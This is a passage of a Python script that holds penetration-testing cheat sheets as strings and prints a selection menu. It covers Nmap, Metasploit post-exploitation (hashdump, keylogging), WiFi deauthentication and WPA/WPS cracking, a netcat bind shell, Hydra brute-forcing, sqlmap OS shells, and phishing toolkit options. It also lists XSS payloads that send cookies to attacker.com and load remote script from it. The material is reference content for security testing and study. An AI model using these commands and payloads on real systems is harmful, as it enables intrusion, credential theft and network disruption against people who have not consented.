port 40425 => mp - Master's Paradise (hacked) TROJAN 
port 43188 => reachout - reachout 
port 44818 => rockwell-encap - Rockwell Encapsulation 
port 45678 => eba - EBA PRISE 
port 47557 => dbbrowse - Databeam Corporation 
port 47624 => directplaysrvr - Direct Play Server 
port 47806 => ap - ALC Protocol 
port 47808 => bacnet - Building Automation and Control Networks 
port 48000 => nimcontroller - Nimbus Controller 
port 48001 => nimspooler - Nimbus Spooler 
port 48002 => nimhub - Nimbus Hub 
port 48003 => nimgtw - Nimbus Gateway 
port 50505 => sokets - Sokets de Trois 2 TROJAN 
port 54320 => bo2k - Back Orifice 2000 TROJAN 
port 54321 => bo2k - Back Orifice 2000 TROJAN 
port 65000 => devil - Devil TROJAN 

"""


nmap_cheatsheet = """
Nmap Cheatsheet
---------------
nmap [options] {target}

nmap 192.168.0.1                  # Scan a single IP address
nmap 192.168.0.1/24               # Scan a range of IP addresses
nmap -sS 192.168.0.1              # Use TCP SYN scan (Stealth Scan)
nmap -sU 192.168.0.1              # Use UDP scan
nmap -p 80,443 192.168.0.1        # Scan specific ports
nmap -O 192.168.0.1               # Detect the operating system of the target host
nmap --script vuln 192.168.0.1    # Scan for vulnerabilities using a specific script
nmap -A 192.168.0.1               # Enable OS detection, version detection, script scanning, and traceroute

Other common Nmap options

-sP    # Ping scan - discover hosts on a network
-sT    # TCP connect scan - the default TCP scan
-sU    # UDP scan
-sS    # SYN scan (Stealth Scan)
-sF    # FIN scan
-sX    # Xmas scan
-sN    # NULL scan
-A     # Enable OS detection, version detection, script scanning, and traceroute
-v     # Increase verbosity level (use -vv or -vvv for more)
-p     # Specify the ports to be scanned
-oN    # Output scan results to a file in normal format
-oX    # Output scan results to a file in XML format
-oG    # Output scan results to a file in grepable format
"""
# Add red color to all text after "#"
nmap_cheatsheet = nmap_cheatsheet.replace("#", "\033[1;31m#\033[m")

windows_command_cheatsheet = """
Windows Command Cheatsheet
--------------------------
dir        # - This command lists the contents of a directory.

cd         # - This command changes the current directory.

mkdir      # - This command creates a new directory.

echo       # - This command displays text on the screen or writes text to a file.

type       # - This command displays the contents of a file.

copy       # - This command copies a file from one location to another.

xcopy      # - This command copies files and directories, including subdirectories.

move       # - This command moves a file from one location to another.

ren        # - This command renames a file.

del        # - This command deletes a file.

rmdir      # - This command removes a directory.

netstat    # - This command displays active network connections.

ipconfig   # - This command displays information about the computer's network configuration.

ping       # - This command tests connectivity to a network host.

tracert    # - This command traces the route taken by network packets to a remote host.

tasklist   # - This command displays a list of currently running processes.

taskkill   # - This command terminates a running process.

systeminfo # - This command displays system information, including operating system version and hardware specifications.

wmic       # - This command-line tool provides access to Windows Management Instrumentation (WMI) information.

regedit    # - This command launches the Windows Registry Editor, which allows you to view and edit the system registry.
"""
# Add red color to all text after "#"
windows_command_cheatsheet = windows_command_cheatsheet.replace("#", "\033[1;31m#\033[m")

linux_command_cheatsheet = """
Linux Command Cheatsheet
------------------------
ls                         # List directory contents
                           # Lists the files and directories in the current directory
pwd                        # Print working directory
                           # Shows the current working directory
cd [directory]             # Change directory
                           # Changes the current directory to the specified directory
mkdir [directory]          # Make directory
                           # Creates a new directory with the specified name
rm [file]                  # Remove file
                           # Deletes the specified file
rm -r [directory]          # Remove directory
                           # Deletes the specified directory and all of its contents
cp [source] [destination]  # Copy file or directory
                           # Copies the specified file or directory to the specified destination
mv [source] [destination]  # Move file or directory
                           # Moves the specified file or directory to the specified destination
cat [file]                 # Print file contents
                           # Displays the contents of the specified file
less [file]                # View file contents one page at a time
                           # Displays the contents of the specified file one page at a time
grep [string] [file]       # Search for a string in a file
                           # Searches for the specified string in the specified file
ps                         # List running processes
                           # Displays a list of all running processes
top                        # Display system resource usage
                           # Shows real-time system resource usage
sudo [command]             # Execute command as root
                           # Runs the specified command with root privileges
chmod [permissions] [file] # Change file permissions
                           # Changes the permissions of the specified file to the specified permissions

"""
# Add red color to all text after "#"
linux_command_cheatsheet = linux_command_cheatsheet.replace("#", "\033[1;31m#\033[m")

metasploit_cheatsheet = """
Metasploit Cheatsheet
---------------------
Basic Commands

msfconsole   # starts the Metasploit console
msfupdate    # updates the Metasploit framework to the latest version
msfdb init   # initializes the Metasploit database
msfdb reinit # re-initializes the Metasploit database

Payloads

msfvenom                              # generates payloads in various formats for Metasploit
windows/meterpreter/reverse_tcp       # a Windows meterpreter reverse TCP payload
linux/x86/meterpreter/reverse_tcp     # a Linux meterpreter reverse TCP payload

Exploits

use <exploit>                         # selects an exploit to use
show exploits                         # lists all available exploits
search <keyword>                      # searches for exploits containing the specified keyword
set RHOST <target IP>                 # sets the target host IP address
set PAYLOAD <payload>                 # sets the payload to be used
set LHOST <attacker IP>               # sets the attacker IP address
set LPORT <attacker port>             # sets the attacker port
set SRVHOST <attacker IP>             # sets the Metasploit listener IP address
set SRVPORT <attacker port>           # sets the Metasploit listener port
run                                   # runs the exploit

Post Exploitation

sessions                              # lists all active meterpreter sessions
sessions -i <session ID>              # connects to the specified meterpreter session
getsystem                             # attempts to escalate privileges on the compromised system
hashdump                              # dumps the password hashes on the compromised system
ps                                    # lists the running processes on the compromised system
shell                                 # drops into a system shell on the compromised system
upload <local file> <remote path>     # uploads a file from the local machine to the compromised system
download <remote file> <local path>   # downloads a file from the compromised system to the local machine
keyscan_start                         # starts a keylogger on the compromised system
keyscan_dump                          # dumps the keystrokes captured by the keylogger
"""
# Add red color to all text after "#"
metasploit_cheatsheet = metasploit_cheatsheet.replace("#", "\033[1;31m#\033[m")

wifi_hacking = """

General Information
# Bypass MAC filter
macchanger –m B0:D0:9C:5C:EF:86 wlan0

Monitoring, Recon and Dumping

# Using the aircrack-ng suite
# Turning on the monitor mode
sudo airmon-ng start wlan0mon

# Simple passive listening and capture
# Used to discover AP in the environment
sudo airodump-ng wlan0mon

# Targetted listening and capture
# Focus on one AP and one channel
sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile

Attacking WEP 
# WEP is an old encryption protocol but still used in some places
# It is vulnerable to direct cracking attacks

# The only requirement is to get enough IV
# The process can be enhanced by sending deauth packets
# -0 == detauth attack, sending 3 packets (can be increased)
aireplay-ng -0 3 -a <TARGET_AP_MAC> wlan0mon -w 

# Another possibility is to use fake authentication to generate IV
# -1 = fake authentication
# 0 = delay between association demands
# -e = AP ESSID (name)
# -a = AP MAC
# -h = attacker MAC
aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon

# ARP Sniffing and injection is another method
aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon

# Using aircrack-ng it is possible to directly crack the WEP Key
aircrack-ng outfile -w wordlist

Aircrack-NG 
---------------------
Basic Commands

iwconfig                   #Show wireless interfaces
iwlist                     #Show wireless interfaces
iwlist wlan0 scanning      #Show inform­ation about wireless networks next to interface
iwconfig wlan0 channel <n> #Change the channel of interface wlan0 to <n>
iwconfig wlan0 down        #Disables wlan0 interface
iwconfig wlan0 up          #Enables wlan0 interface

Aircra­ck-ng basic

airmon-ng check kill                                                    #Disable process that could cause troubles in wifi hacking
airmon-ng start wlan0                                                   #Put wlan0 interface on monitor mode
airmon-ng stop wlan0mon                                                 #Put wlan0 interface back to normal
airodu­mp-ng wlan0mon                                                   #Start packet capture on wlan0mon
airodu­mp-ng wlan0mon --channel <n> --essid <Wi­fi-­Nam­e>              #Filter packet capture with channel and Wifi ESSID
airodu­mp-ng wlan0mon --channel <n> --essid <Wi­fi-­Nam­e> -w fi­len­ame#Record packet capture in <fi­len­ame>
airodu­mp-ng -r file.pcap                                               #Reads file.pcap as in airodu­mp-ng
airepl­ay-ng --deauth <n> -a <BS­SID> wlan1mon                          #Send DoS attack on BSSID with n packets. 0 means infinity loop.


Attacking WPA2 PSK (The old way) 

# Using the aircrack-ng suite
# You can first focus one AP using airodump-ng (see monitoring section)
# Here, you want to get the 4-way WPA Handshake
# It requires network traffic between the AP and one device

# Dumping
sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile

# Deauth connected devices to initiate authentication process and try to get the handshake
aireplay-ng --deauth 15 -a <TARGET_AP_MAC> wlan0mon
aireplay-ng -0 15 -a <TARGET_AP_MAC> wlan0mon 

# In the airodump-ng console, the WPA handshake will appear once captured


Attacking WPA2 using PMKID 

# You don't need any network traffic
# Using hcxtools and hcxdumptool

# Monitor mode
sudo airmon-ng start wlan0mon

# PMKID capture
# It can take a while to capture PKMID (several minutes++)
# If an AP recieves our association request packet and supports sending 
sudo hcxdumptool -i wlan0mon -o outfile.pcapng --enable_status=1

# Then convert the captured data to a suitable format for hashcat
# -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)
# -I retrieve identities from WiFi-traffic
# -U retrieve usernames from WiFi-traffic
sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng

# Then, you can use hashcat to crack it (see hashcat section)
./hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'

Attacking WPS (WiFi Protected Setup) 

# Reaver Attack
# Online bruteforcing of the WPS 8-digits PIN
# Kinda old and can be obsolete nowadays, but still usable

# Reaver integrated dumping tool (can also airodump-ng)
# Wash gives information about WPS being locked or not
# Locked WPS will have less success chances
wash -i wlan0mon

# Launching reaver
reaver -i wlan0mon -c 6 -b 00:23:69:48:33:95 -vv

# Some manufacturers have implemented protections
# You can try different switches to bypass
# -L = Ignore locked state
# -N = Don't send NACK packets when errors are detected
# -d = delay X seconds between PIN attempts
# -T = set timeout period to X second (.5 means half second)
# -r = After X attemps, sleep for Y seconds
reaver -i mon0 -c 6 -b 00:23:69:48:33:95  -vv -L -N -d 15 -T .5 -r 3:15

Bettercap Pwning (https://www.bettercap.org/modules/) 

# Deauth and 4-way handshake attack
sudo bettercap -iface wlan0

# Start the monitoring mode
> wifi.recon on

# Set the AP sorting by clients number
> set wifi.show.sort clients desc

# Every 1 sec, clear view and display an updated one
> set ticker.commands 'clear; wifi.show'
> ticker on

# Set the target channel
> wifi.recon.channel 1

# Initiate deauth packets
> wifi.deauth e0:xx:xx:xx:xx:xx

# Convert
/path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx

# Cracking
/path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'


"""
# Add red color to all text after "#"
wifi_hacking = wifi_hacking.replace("#", "\033[1;31m#\033[m")

netcat = """
nc      # - This command starts the Netcat program.

-l      # - This option specifies that Netcat should listen for incoming connections.

-p      # - This option specifies the port number to use.

-e      # - This option allows you to execute a program on the remote system.

-u      # - This option specifies that Netcat should use UDP instead of TCP.

-v      # - This option enables verbose output, providing more detailed information about what Netcat is doing.

-n      # - This option disables DNS lookups, speeding up connections.

-z      # - This option tests for open ports without sending any data.
     
-k      # - This option allows Netcat to remain open and continue listening for connections after a connection is closed.

-s      # - This option allows you to specify the source IP address to use.

hostname   # - This command specifies the hostname or IP address of the target system.

port       # - This command specifies the port number to connect to on the target system.

CTRL-C     # - This command interrupts Netcat and terminates the connection.

CTRL-D     # - This command sends an end-of-file (EOF) marker, indicating the end of input.

CTRL-Z     # - This command sends a SIGTSTP signal, pausing Netcat and returning control to the shell.

CTRL-]     # - This command sends a telnet escape character, allowing you to enter Netcat commands while connected.

echo "message" | nc hostname port   # - This command sends a message to the target system.

nc -l -p port < file                # - This command listens on a port and sends the contents of a file to any connecting clients.

nc -l -p port > file                # - This command listens on a port and saves any incoming data to a file.

nc -l -p port -e /bin/bash          # - This command listens on a port and executes a shell on any connecting clients.

"""
# Add red color to all text after "#"
netcat= netcat.replace("#", "\033[1;31m#\033[m")

hydra = """

hydra # - This command starts the Hydra program.

-l # - This option specifies the username to use.

-P # - This option specifies the password file to use.

-t # - This option specifies the number of threads to use.

-f # - This option stops Hydra after the first valid username/password combination is found.

-o # - This option specifies the output file to use.

-s # - This option specifies the port number to use.

-vV # - This option enables verbose output and displays version information.

-M # - This option specifies a list of target IP addresses or hostnames.

-m # - This option specifies the type of service to attack (e.g. FTP, SSH, Telnet, etc.).

-e # - This option specifies the character set to use for brute-forcing passwords.

-u # - This option specifies the target URL to use for web-based attacks.

-w # - This option specifies the web form to use for web-based attacks.

-S # - This option enables SSL encryption for web-based attacks.

-U # - This option specifies a list of usernames to use.

-p # - This option specifies a single password to use.

-C # - This option specifies a configuration file to use.

-x # - This option specifies the password mask to use for brute-forcing passwords.

-r # - This option specifies the proxy to use for web-based attacks.

-I # - This option enables Hydra to ignore server responses and continue brute-forcing.

Example usage:

hydra -l username -P password.txt ftp://target.com # - This command attempts to brute-force the FTP login for the specified username using the passwords in the specified file.

hydra -L usernames.txt -P password.txt ssh://target.com # - This command attempts to brute-force the SSH login using the usernames in the specified file and the passwords in the specified file.

hydra -l admin -P password.txt -s 8080 target.com http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:Incorrect" # - This command attempts to brute-force a web login form with the specified URL, username, and password file. The "Incorrect" parameter specifies what the server response will be if the login is unsuccessful.

"""
# Add red color to all text after "#"
hydra= hydra.replace("#", "\033[1;31m#\033[m")

DirBuster = """
DirBuster # - This command starts the DirBuster program.

-t # - This option specifies the number of threads to use.

-u # - This option specifies the target URL to use.

-w # - This option specifies the wordlist file to use.

-x # - This option specifies the file extension to use.

-e # - This option specifies the response code to ignore.

-k # - This option enables SSL encryption.

-l # - This option enables recursive scanning.

-i # - This option specifies the input file to use.

-o # - This option specifies the output file to use.

-c # - This option specifies the cookie to use.

-H # - This option specifies the header to use.

-s # - This option specifies the proxy server to use.

-b # - This option specifies the user agent to use.

-q # - This option specifies the delay time between requests.

-v # - This option enables verbose output.

Example usage:

DirBuster -u http://target.com -w /usr/share/dirb/wordlists/big.txt -t 20                                                                         # - This command starts DirBuster and specifies the target URL, wordlist file, and number of threads to use.

DirBuster -u https://target.com -w /usr/share/dirb/wordlists/vulns/apache.txt -x php -e 404                                                       # - This command starts DirBuster and specifies the target URL, wordlist file, file extension, and response code to ignore.

DirBuster -u http://target.com -w /usr/share/dirb/wordlists/vulns/directory-list-2.3-medium.txt -l -o output.txt                                  # - This command starts DirBuster and specifies the target URL, wordlist file, and enables recursive scanning while saving the output to a file.

DirBuster -i urls.txt -w /usr/share/dirb/wordlists/vulns/directory-list-2.3-medium.txt -t 10 -c "PHPSESSID=12345" -H "Referer: http://target.com" # - This command starts DirBuster and specifies an input file with a list of URLs, a wordlist file, number of threads to use, a cookie to use, and a header to use.

"""
# Add red color to all text after "#"
DirBuster= DirBuster.replace("#", "\033[1;31m#\033[m")
wireshark = """
Wireshark 

ip.addr == x.x.x.x                                   # - This command filters packets by IP address, where x.x.x.x is the desired IP address.

tcp.port == ##                                       # - This command filters packets by TCP port number, where ## is the desired port number.

udp.port == ##                                       # - This command filters packets by UDP port number, where ## is the desired port number.

ip.dst == x.x.x.x and tcp.port == ##                 # - This command filters packets by destination IP address and TCP port number.

http                                                 # - This command filters packets that contain HTTP protocol.

dns                                                  # - This command filters packets that contain DNS protocol.

icmp                                                 # - This command filters packets that contain ICMP protocol.

eth.addr == xx:xx:xx:xx:xx:xx                        # - This command filters packets by MAC address, where xx:xx:xx:xx:xx:xx is the desired MAC address.

ip.addr == x.x.x.x and http.request.method == "POST" # - This command filters packets by source IP address and HTTP request method.

tcp.flags.syn == 1                                   # - This command filters packets with the SYN flag set.

ip.addr == x.x.x.x and tcp.flags.fin == 1            # - This command filters packets with the FIN flag set for a specific IP address.

frame contains "search term"                         # - This command filters packets that contain a specific search term.

Example usage:

ip.addr == 192.168.1.1   # - This command filters all packets sent or received by the IP address 192.168.1.1.

tcp.port == 80    # - This command filters all packets sent or received on port 80, which is commonly used for HTTP traffic.

ip.src == 10.0.0.1 and udp.port == 53    # - This command filters all packets sent from the IP address 10.0.0.1 and received on port 53, which is commonly used for DNS traffic.

http.request.method == "POST"    # - This command filters all packets that contain an HTTP POST request.

frame contains "password"   # - This command filters all packets that contain the string "password".

"""
# Add red color to all text after "#"
wireshark= wireshark.replace("#", "\033[1;31m#\033[m")

set = """
Social Engineering Toolkit

setoolkit                        # - This command opens the SET menu and provides a list of different attacks and options.

1. Spear-Phishing Attack Vector  # - This command initiates the Spear-Phishing Attack Vector. This is used to send a targeted phishing email to a specific individual.

2. Website Attack Vectors        # - This command initiates the Website Attack Vectors. This is used to create a fake website and steal credentials entered by the victim.

3. Infectious Media Generator    # - This command initiates the Infectious Media Generator. This is used to create a malicious USB drive or CD that will automatically execute code when plugged in.

4. Create a Payload and Listener # - This command initiates the Payload and Listener Creator. This is used to create a malicious payload that can be delivered to the victim and establish a connection back to the attacker's machine.

5. Mass Mailer Attack            # - This command initiates the Mass Mailer Attack. This is used to send a phishing email to a large group of individuals.

6. SMS Spoofing Attack Vector    # - This command initiates the SMS Spoofing Attack Vector. This is used to send a spoofed SMS message to a victim.
 
7. Third Party Modules           # - This command initiates the Third Party Modules. This is used to load third-party modules into SET for additional functionality.

setoolkit –update                                  # - This command updates the SET tool to the latest version.
  
setoolkit –info                                    # - This command displays information about the SET tool, including the version, author, and website.

setoolkit –ip x.x.x.x                              # - This command sets the IP address of the attacking machine, where x.x.x.x is the IP address.

setoolkit –payload android/meterpreter/reverse_tcp # - This command sets the type of payload to be used in the attack.

Example usage:

setoolkit –ip 192.168.1.100                        # - This command sets the IP address of the attacking machine to 192.168.1.100.

setoolkit –payload windows/meterpreter/reverse_tcp # - This command sets the type of payload to be used in the attack.

"""
# Add red color to all text after "#"
set= set.replace("#", "\033[1;31m#\033[m")

sqlmap ="""
sqlmap -u URL                  # - This command scans the target URL for SQL injection vulnerabilities.

sqlmap -r request.txt          # - This command scans a file containing an HTTP request for SQL injection vulnerabilities.

sqlmap -d DBNAME -D DATABASE   # - This command specifies the database name and the database to be tested for SQL injection vulnerabilities.

sqlmap -p PARAMETER            # - This command specifies the parameter to be tested for SQL injection vulnerabilities.

sqlmap --level=LEVEL           # - This command sets the level of testing for SQL injection vulnerabilities. Higher levels mean more thorough testing.

sqlmap --risk=RISK             # - This command sets the risk level of testing for SQL injection vulnerabilities. Higher risk levels mean more aggressive testing.

sqlmap --random-agent          # - This command sets a random user agent for the testing process.

sqlmap --cookie=COOKIE         # - This command sets a cookie to be used in the testing process.

sqlmap --dump                  # - This command dumps the contents of the database found during testing.

sqlmap --os-shell              # - This command opens an OS shell on the target machine.

sqlmap --batch                 # - This command runs sqlmap in batch mode.

sqlmap --threads=THREADS       # - This command sets the number of threads to be used in the testing process.

Example usage:

sqlmap -u "http://www.example.com/page.php?id=1"                      # - This command scans the URL "http://www.example.com/page.php?id=1" for SQL injection vulnerabilities.

sqlmap -r request.txt --level=5 --risk=3                              # - This command scans the HTTP request contained in request.txt for SQL injection vulnerabilities using a high level and high risk.

sqlmap -p id --os-shell                                               # - This command tests the "id" parameter for SQL injection vulnerabilities and opens an OS shell on the target machine.

sqlmap -u "http://www.example.com/page.php?id=1" --dump               # - This command scans the URL "http://www.example.com/page.php?id=1" for SQL injection vulnerabilities and dumps the contents of the database found during testing.

sqlmap -u "http://www.example.com/page.php?id=1" --batch --threads=10 # - This command scans the URL "http://www.example.com/page.php?id=1" for SQL injection vulnerabilities in batch mode using 10 threads.

"""
# Add red color to all text after "#"
sqlmap= sqlmap.replace("#", "\033[1;31m#\033[m")

xss = """
XSS (Cross-Site Scripting) 

<script>alert('XSS')</script>                                                        # - This is a basic script that creates a popup alert box when the page loads.

<img src=x onerror=alert('XSS')>                                                     # - This script uses the "onerror" attribute to trigger an alert box.

<script>alert(document.cookie)</script>                                              # - This script displays the user's cookie information in an alert box.

<script>document.location='http://attacker.com/?cookie='+document.cookie</script>    # - This script sends the user's cookie information to an attacker-controlled website.

<iframe src="javascript:alert('XSS');"></iframe>                                     # - This script creates an invisible iframe that triggers an alert box.

<a href="javascript:alert('XSS')">Click me</a>                                       # - This script creates a link that triggers an alert box when clicked.

<svg onload=alert('XSS')>                                                            # - This script uses an SVG image to trigger an alert box.

<img src='http://attacker.com/xss.php?cookie='+document.cookie>                      # - This script sends the user's cookie information to an attacker-controlled server by loading an image from a URL that includes the cookie information.

<img src=1 href=1 onerror=alert('XSS')>                                              # - This script uses the "href" attribute to trigger an alert box.

<script>new Image().src="http://attacker.com/?cookie="+document.cookie;</script>     # - This script sends the user's cookie information to an attacker-controlled server by loading an image from a URL that includes the cookie information.

<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>  # - This script uses the "eval" function to execute JavaScript code.

<script src="http://attacker.com/xss.js"></script>                                   # - This script includes an external JavaScript file from an attacker-controlled server.

<script>while(true){alert('XSS');}</script>                                          # - This script creates an infinite loop that triggers an alert box.

<script>prompt('XSS')</script>                                                       # - This script creates a prompt box that displays the message "XSS".

<iframe srcdoc="<script>alert('XSS')</script>"></iframe>                             # - This script creates an iframe with a script that triggers an alert box.

<body/onload=alert('XSS')>                                                           # - This script uses the "onload" attribute to trigger an alert box when the page loads.

<input type="text" value="<script>alert('XSS')</script>">                            # - This script creates an input field with a script that triggers

<script>document.write('<img src="http://attacker.com/?cookie='+document.cookie+'" />')</script>                                  # - This script sends the user's cookie information to an attacker-controlled server by dynamically creating an image with the cookie information in the URL.

<script>var xhr = new XMLHttpRequest();xhr.open("GET", "http://attacker.com/?cookie="+document.cookie, true);xhr.send();</script> # - This script sends the user's cookie information to an attacker-controlled server using an XMLHttpRequest object.

"""
# Add red color to all text after "#"
xss= xss.replace("#", "\033[1;31m#\033[m")

oneliner = """

awesome-oneliner-bugbounty

Sources : https://github.com/dwisiswant0/awesome-oneliner-bugbounty
This section defines specific terms or placeholders that are used throughout one-line command/scripts.

1.1. "HOST" defines one hostname, (sub)domain, or IP address, e.g. replaced by internal.host, domain.tld, sub.domain.tld, or 127.0.0.1.
1.2. "HOSTS.txt" contains criteria 1.1 with more than one in file.
2.1. "URL" definitely defines the URL, e.g. replaced by http://domain.tld/path/page.html or somewhat starting with HTTP/HTTPS protocol.
2.2. "URLS.txt" contains criteria 2.1 with more than one in file.
3.1. "FILE.txt" or "FILE{N}.txt" means the files needed to run the command/script according to its context and needs.
4.1. "OUT.txt" or "OUT{N}.txt" means the file as the target storage result will be the command that is executed.

Local File Inclusion
# gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

Open-redirect
# export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
# cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null

XSS
# gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
# waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
# cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"

Prototype Pollution
# subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

Find JavaScript Files
# assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done

Extract Endpoints from JavaScript
# cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

Get CIDR & Org Information from Target Lists
# for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done

Get Subdomains from RapidDNS.io
# curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u

Get Subdomains from BufferOver.run
# curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
# export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"

Get Subdomains from Riddler.io
#curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 

Get Subdomains from VirusTotal
#curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomains from CertSpotter
# curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 

Bruteforcing Subdomain using DNS Over
# while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u ; done < FILE.txt

Subdomain Bruteforcer with FFUF
# ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'

Find Allocated IP Ranges for ASN from IP Address
# whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n

Extract IPs from a File
# grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt

Ports Scan without CloudFlare
# subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe

Extracts Juicy Informations
# for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done

Dump Custom URLs from ParamSpider
# cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;

Dump URLs from sitemap.xml
# curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'

Find Hidden Servers and/or Admin Panels
# ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 

Find Live Host/Domain/Assets
# subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u

Get Subdomains from IPs
# python3 hosthunter.py HOSTS.txt > OUT.txt

"""
# Add red color to all text after "#"
oneliner= oneliner.replace("#", "\033[1;31m#\033[m")

ffuf = """
Source : https://github.com/ffuf/ffuf

# Directory discovery
ffuf -w /path/to/wordlist -u https://target/FUZZ

# Adding classical header (some WAF bypass)
ffuf -c -w "/opt/host/main.txt:FILE" -H "X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, X-Remote-IP: 127.0.0.1, X-Remote-Addr: 127.0.0.1, X-Client-IP: 127.0.0.1" -fs 5682,0 -u https://target/FUZZ

# match all responses but filter out those with content-size 42
ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v

# Fuzz Host-header, match HTTP 200 responses.
ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200

# Virtual host discovery (without DNS records)
ffuf -w /path/to/vhost/wordlist -u https://target -H "Host: FUZZ" -fs 4242


# Playing with threads and wait
./ffuf -u https://target/FUZZ -w /home/mdayber/Documents/Tools/Wordlists/WebContent_Discovery/content_discovery_4500.txt -c -p 0.1 -t 10


# GET param fuzzing, filtering for invalid response size (or whatever)
ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242

# GET parameter fuzzing if the param is known (fuzzing values) and filtering 401
ffuf -w /path/to/values.txt -u https://target/script.php?valid_name=FUZZ -fc 401

# POST parameter fuzzing
ffuf -w /path/to/postdata.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401

# Fuzz POST JSON data. Match all responses not containing text "error".
ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \
      -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"
"""
# Add red color to all text after "#"
ffuf= ffuf.replace("#", "\033[1;31m#\033[m")

###############################################################################################################################################
# Choice form
print('Please choose which cheatsheet you would like to view:')

print('0. HTTP')
print('1. Port')

print('2. Nmap')
print('3. Windows Commands')
print('4. Linux Commands')
print('5. Metasploit')
print('6. WiFi-Hacking')
print('7. Netcat')
print('8. Hydra')
print('9. Dirbuster')
print('10. Wireshark')
print('11. SET')
print('12. SQLMap')
